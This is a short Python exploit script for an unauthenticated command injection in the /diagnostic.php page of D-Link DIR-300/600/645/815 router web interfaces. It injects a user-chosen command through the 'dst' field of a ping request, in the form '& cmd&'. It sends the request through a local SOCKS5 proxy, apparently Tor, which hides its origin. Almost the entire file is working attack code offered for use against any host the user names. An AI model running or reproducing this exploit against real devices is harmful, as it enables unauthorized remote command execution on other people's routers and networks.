#!/usr/bin/python3

import sys
import urllib.parse
import urllib.request
import socks
from sockshandler import SocksiPyHandler

# TODO: Rewrite this entire module. This was created nearly two years ago at
# the time of this commit, and after reading it over I am realizing that 
# there is probably more efficient ways of doing this. 

def exploit( rhost , rport, cmd ):
	'''
	This module exploits an unauthenticated command injection vulerability
	in the D-LINK DIR-300/600/645/815 web interfaces at /diagnostic.php. This
	vulnerability affects these routers on firmware versions < 1.03, however
	it is also possible on firmware v1.03 with valid credentials for the 
	web interface.
	'''
	url 		= 'http://{0!s}:{1!s}/diagnostic.php'.format(rhost, rport)
	header		= {
		'Host': '{0!s}:{1!s}'.format(rhost, rport),
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101',
		'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
		'Connection': 'Close'
	}
	post_args 	= ({
		'act': 'ping',
		'dst': '& %s&' %cmd
		})

	opener 		= urllib.request.build_opener(SocksiPyHandler(socks.SOCKS5, '127.0.0.1', 9050))
	enc_args 	= urllib.parse.urlencode(post_args, quote_via=urllib.parse.quote, safe='').encode('utf-8')
	request 	= urllib.request.Request(url, enc_args, header)
	response 	= opener.open(request).read()

def main():
	'''
	Get the host and port of the router we want to send our command injection
	to, then pass those variables to the exploit function. This will later
	be changed so they can be passed as command line arguments instead of
	getting them from STDIN.
	'''
	remote_host	= input('Enter host IP: ')
	remote_port = input('Enter host port running the HTTP service (usually 80 or 8080): ')
	command 	= input('Enter the command you want to execute on the router: ')

	exploit(remote_host, remote_port, command)

if __name__ == '__main__':
	main()